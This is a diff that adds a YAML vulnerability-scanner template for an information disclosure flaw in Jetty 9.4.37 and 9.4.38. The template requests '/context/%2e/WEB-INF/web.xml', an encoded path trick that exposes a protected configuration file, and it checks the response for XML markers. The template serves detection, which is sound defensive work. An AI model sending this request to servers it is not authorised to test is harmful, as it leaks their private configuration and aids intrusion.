@@ -1,0 +1,25 @@
+id: jetty-information-disclosure
+info:
+  author: geeknik
+  name: Jetty 9.4.37 & 9.4.38 Information Disclosure
+  reference: http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.117479
+  severity: low
+  tags: jetty
+requests:
+- matchers:
+  - part: header
+    type: word
+    words:
+    - application/xml
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - <web-app>
+    - java.sun.com
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/context/%2e/WEB-INF/web.xml'
